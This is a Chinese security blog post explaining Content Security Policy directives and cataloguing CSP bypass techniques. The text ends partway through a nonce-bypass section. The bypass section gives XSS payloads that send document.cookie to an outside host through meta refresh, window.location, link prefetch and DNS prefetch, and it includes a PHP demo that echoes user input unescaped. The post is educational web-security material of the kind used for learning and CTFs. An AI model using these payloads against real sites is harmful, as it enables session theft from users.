<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.8.0">

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<meta name="author" content="Mi1k7ea">



<meta name="description" content="已完结.">
<meta name="keywords" content="Web安全,XSS">
<meta property="og:type" content="article">
<meta property="og:title" content="CSP策略及绕过技巧小结">
<meta property="og:url" content="https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/index.html">
<meta property="og:site_name" content="Mi1k7ea">
<meta property="og:description" content="已完结.">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/3.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/4.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/5.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/6.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/1.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/2.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/8.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/9.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/10.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/11.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/12.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/13.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/14.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/15.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/16.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/17.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/20.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/22.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/21.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/18.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/19.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/24.png">
<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/23.png">
<meta property="og:updated_time" content="2019-05-28T14:17:20.838Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CSP策略及绕过技巧小结">
<meta name="twitter:description" content="已完结.">
<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/3.png">

<link rel="apple-touch-icon" href="/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="Mi1k7ea" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/favicon.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>CSP策略及绕过技巧小结 | Mi1k7ea</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Mi1k7ea</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false">
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">Home</a></li>
                        
                            <li><a href="/archives/">Articles</a></li>
                        
                            <li><a href="/tags/">Classification</a></li>
                        
                            <li><a href="/about/">About</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:mi1k7ea@163.com" title="Email"></a>
                            
                                <a class="fa CSDN" href="https://blog.csdn.net/ski_12/" title="CSDN"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWD/">AWD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLI/">SQLI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XML注入/">XML注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/二进制/">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆溢出/">堆溢出</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安全开发/">安全开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/栈溢出/">栈溢出</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/沙箱逃逸/">沙箱逃逸</a></li></ul>
                    </div>
                </section>
                
                
                

                
                
                <section class="switch-part switch-part3">
                
                    <div id="js-aboutme">安全界咸鱼</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Mi1k7ea</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Mi1k7ea</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">Home</a></li>
                
                    <li><a href="/archives/">Articles</a></li>
                
                    <li><a href="/tags/">Classification</a></li>
                
                    <li><a href="/about/">About</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:mi1k7ea@163.com" title="Email"></a>
                            
                                <a class="fa CSDN" target="_blank" href="https://blog.csdn.net/ski_12/" title="CSDN"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
</nav>
      <div class="body-wrap"><article id="post-CSP策略及绕过技巧小结" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/02/24/CSP策略及绕过技巧小结/" class="article-date">
      <time datetime="2019-02-24T05:47:07.000Z" itemprop="datePublished">2019-02-24</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      CSP策略及绕过技巧小结
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Web安全基础/">Web安全基础</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="0x01-何为CSP"><a href="#0x01-何为CSP" class="headerlink" title="0x01 何为CSP"></a>0x01 何为CSP</h2><p>CSP（Content Security Policy）即内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。</p>
<p>CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。</p>
<h2 id="0x02-CSP语法"><a href="#0x02-CSP语法" class="headerlink" title="0x02 CSP语法"></a>0x02 CSP语法</h2><p>CSP中常见的header字段为Content-Security-Policy。</p>
<p>一个CSP头由多组CSP策略组成，中间由分号分隔，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos; www.baidu.com; script-src &apos;unsafe-inline&apos;</span><br></pre></td></tr></table></figure>
<p>其中每一组策略包含一个策略指令和一个内容源列表。</p>
<h3 id="策略指令"><a href="#策略指令" class="headerlink" title="策略指令"></a>策略指令</h3><h4 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h4><p>default-src作为所有其他指令的备用，一般来说default-src ‘none’; script-src ‘self’这样的情况就会是script-src遵循self，其他的都会使用none。也就是说，除了被设置的指令以外，其余指令都会被设置为default-src指令所设置的属性。</p>
<h4 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h4><p>script-src指令限制了所有js脚本可以被执行的地方，包括通过链接方式加载的脚本url以及所有内联脚本，甚至包括各种方式的引用。其中还有一个很重要的参数叫’unsafe-inline’，如果加上这个参数，就不会阻止内联脚本，但这被认为是不安全的。</p>
<p>对于这个属性有个特殊的配置叫unsafe-eval，它会允许下面几个函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`eval()Function()setTimeout() with an initial argument which is not callable.setInterval() with an initial argument which is not callable.`</span><br></pre></td></tr></table></figure>
<h4 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h4><p>style-src定义了页面中CSS样式的有效来源，包括下面三种引用的css属性，style也有个‘unsafe-inline’这个参数，同理会允许所有的内联css。</p>
<p>1、第一种是通过link标签加载的css，类似于<code>&lt;link href=&quot;001.css&quot; type=&quot;text/css&quot; rel=&quot;Stylesheet&quot;/&gt;</code></p>
<p>2、当然还有style标签</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"><span class="selector-class">.main</span>&#123; <span class="attribute">width</span>:<span class="number">1002px</span>; <span class="attribute">margin</span>:<span class="number">0</span> auto;&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
<p>3、还有通过@import引入的样式表</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt; STYLE TYPE="text/css"&gt; </span><br><span class="line">@<span class="keyword">import</span> <span class="string">"example.css"</span>; </span><br><span class="line">@<span class="keyword">import</span> <span class="string">"style/other.css"</span>; </span><br><span class="line">&lt; /STYLE&gt;</span><br></pre></td></tr></table></figure>
<p>4、内联样式表，类似于<code>style=&quot;font-size:10px;font-color:#ff0000&quot;</code></p>
<h4 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h4><p>img-src定义了页面中图片和图标的有效来源。</p>
<h4 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h4><p>font-src定义了字体加载的有效来源。</p>
<h4 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h4><p>connect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。如下例子：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="tag">&lt;<span class="name">a</span> <span class="attr">ping</span>=<span class="string">"https://not-example.com"</span>&gt;</span>...<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();  xhr.open(<span class="string">'GET'</span>, <span class="string">'https://not-example.com/'</span>);  xhr.send();  <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">"https://not-example.com/"</span>);          <span class="keyword">var</span> es = <span class="keyword">new</span> EventSource(<span class="string">"https://not-example.com/"</span>);  navigator.sendBeacon(<span class="string">"https://not-example.com/"</span>, &#123; ... &#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`</span><br></pre></td></tr></table></figure>
<h4 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h4><p>child-src 指定定义了 web workers 以及嵌套的浏览上下文（如frame和iframe）的源。</p>
<p>会匹配iframe和frame标签，如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先设置csp</span><br><span class="line">Content-Security-Policy: child-src https://example.com/</span><br><span class="line">而下面的请求会被CSP拦截</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://not-example.com"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> blockedWorker = <span class="keyword">new</span> Worker(<span class="string">"data:application/javascript,..."</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="manifest-src"><a href="#manifest-src" class="headerlink" title="manifest-src"></a>manifest-src</h4><p>manifest-src指令限制了从应用清单可以加载的url。</p>
<p>这个属性不太熟，比较常见的就是link：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">举个例子：</span><br><span class="line">Content-Security-Policy: manifest-src https://example.com/</span><br><span class="line">下面的请求会返回错误:</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"manifest"</span> <span class="attr">href</span>=<span class="string">"https://not-example.com/manifest"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="内容源"><a href="#内容源" class="headerlink" title="内容源"></a>内容源</h3><p>内容源有三种：源列表、关键字和数据。</p>
<h4 id="源列表"><a href="#源列表" class="headerlink" title="源列表"></a>源列表</h4><p>源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘*‘)，端口号也可以使用通配符 (同样是 ‘*‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。</p>
<p> 有效的主机表达式包括：</p>
<p> http://*<a href="http://.foo.com" target="_blank" rel="noopener">.foo.com</a> （匹配所有使用 http协议加载 <a href="http://foo.com" target="_blank" rel="noopener">foo.com</a> 任何子域名的尝试。）</p>
<p> mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）</p>
<p> <a href="https://store.foo.com" target="_blank" rel="noopener">https://store.foo.com</a> （匹配所有使用 https协议访问 <a href="http://store.foo.com" target="_blank" rel="noopener">store.foo.com</a> 的尝试。）</p>
<p> 如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。</p>
<h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><ul>
<li><strong>‘none’</strong><br>代表空集；即不匹配任何 URL。两侧单引号是必须的。</li>
<li><strong>‘self’</strong><br>代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。</li>
<li><strong>‘unsafe-inline’</strong><br>允许使用内联资源，如内联的script元素、javascript: URL、内联的事件处理函数和内联的style元素，两侧单引号是必须的。</li>
<li><strong>‘unsafe-eval’</strong><br>允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。</li>
</ul>
<h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><p> <strong>data:</strong><br> 允许data: URI作为内容来源。</p>
<p><strong>mediastream:</strong><br> 允许mediastream: URI作为内容来源。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; img-src &apos;self&apos; data:; media-src mediastream:</span><br></pre></td></tr></table></figure>
<h2 id="0x03-CSP绕过"><a href="#0x03-CSP绕过" class="headerlink" title="0x03 CSP绕过"></a>0x03 CSP绕过</h2><p>绕过场景其实是很多的，这里慢慢来收集吧，主要是先收集一些广泛公开的和CTF中遇到的吧。</p>
<h3 id="1、绕过default-src-‘none’"><a href="#1、绕过default-src-‘none’" class="headerlink" title="1、绕过default-src ‘none’"></a>1、绕过default-src ‘none’</h3><p>策略为：Content-Security-Policy: default-src ‘none’; </p>
<p>这种情况下，可以使用meta标签实现跳转：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=https://www.mi1k7ea.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure>
<p>Demo如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$nonce = md5(openssl_random_pseudo_bytes(16));</span><br><span class="line">	header(&quot;Content-Security-Policy: default-src &apos;none&apos;; &quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP Test&lt;/h2&gt;</span><br><span class="line">&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;</span><br><span class="line">	&lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	if (isset($_POST[&apos;content&apos;])) &#123;</span><br><span class="line">		echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>当我们输入如下内容可以成功跳转至目标页面，当然也可以将cookie带出来：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=http://192.168.43.201:8000/x.php?c=mi1k7ea"</span> &gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/3.png" alt=""></p>
<h3 id="2、形同虚设的script-src-‘unsafe-inline’"><a href="#2、形同虚设的script-src-‘unsafe-inline’" class="headerlink" title="2、形同虚设的script-src ‘unsafe-inline’"></a>2、形同虚设的script-src ‘unsafe-inline’</h3><p>策略中有一条为：script-src ‘unsafe-inline’; ，这条策略相当于直接让CSP几乎沦陷了大半。</p>
<p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location=<span class="string">"https://www.mi1k7ea.com/x.php?c=[cookie]"</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">'//www.mi1k7ea.com/?'</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">'https://www.mi1k7ea.com/?cookie='</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Demo代码还是之前的，把CSP修改一下，添加script-src ‘unsafe-inline’;即可。</p>
<p>输入如下标签直接跳转并成功返回cookie：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">'http://192.168.43.201:8000/?cookie='</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/4.png" alt=""></p>
<p>内嵌script都可以执行，当然可以直接执行本页面的JS，如输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>即可，这里的利用和XSS利用一致，没有啥绕过技巧，不再累赘。</p>
<h3 id="3、绕过xx-src"><a href="#3、绕过xx-src" class="headerlink" title="3、绕过xx-src *"></a>3、绕过xx-src *</h3><p>*号即允许匹配任何URL请求。但一般情况很少会遇到default-src <em>;或大部分xx-src </em>;这样的CSP策略，举一个简单的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;; connect-src &apos;self&apos;; frame-src *; script-src http://xxxxx/js/ &apos;nonce-xxx&apos;;font-src http://xxxx/fonts/ fonts.gstatic.com; style-src &apos;self&apos; &apos;unsafe-inline&apos;; img-src &apos;self&apos;</span><br></pre></td></tr></table></figure>
<p>很明显地可以找到，frame-src *，其对于iframe的来源并没有做任何限制，当然实际环境可能需要iframe标签来内联来包含别的页面。</p>
<p>可以利用CSRF漏洞。这里直接输入<code>&lt;iframe src=&quot;https://www.mi1k7ea.com&quot;&gt;&lt;/iframe&gt;</code>来测试：</p>
<p> <img src="/2019/02/24/CSP策略及绕过技巧小结/5.png" alt=""></p>
<p>当然，iframe也可以内嵌外部弹框的JS：</p>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/6.png" alt=""></p>
<p>查看页面元素，可以看到iframe内嵌包含进来的是<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，其可以正常执行而无视掉<code>script-src http://xxxxx/js/ &#39;nonce-xxx&#39;;</code>的CSP策略。</p>
<h3 id="4、利用link绕过xx-src-self"><a href="#4、利用link绕过xx-src-self" class="headerlink" title="4、利用link绕过xx-src self"></a>4、利用link绕过xx-src self</h3><p>CSP策略中xx-src self的设置能够使大部分的XSS和CSRF都会失效，但link标签的预加载功能可以进行绕过。</p>
<p>在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"https://www.mi1k7ea.com/c.php?c=[cookie]"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在Firefox下，可以将cookie作为子域名，用DNS预解析的方式把cookie带出去，查看DNS服务器的日志就能得到cookie：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//[cookie].mi1k7ea.com"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在后面的iframe中会有结合利用的示例。</p>
<h3 id="5、利用浏览器补全绕过script-nonce"><a href="#5、利用浏览器补全绕过script-nonce" class="headerlink" title="5、利用浏览器补全绕过script nonce"></a>5、利用浏览器补全绕过script nonce</h3><p>有时候CSP策略可能会设置成如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;;script-src &apos;nonce-xxx&apos;</span><br></pre></td></tr></table></figure>
<p>这种情况下，script标签需要带上正确的nonce属性值才能执行JS代码。</p>
<p>如果，出现了脚本插入点在含有nonce属性值的script标签前面的情况时，如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">"aa"</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'CSP'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以插入如下内容来利用浏览器补全功能：</p>
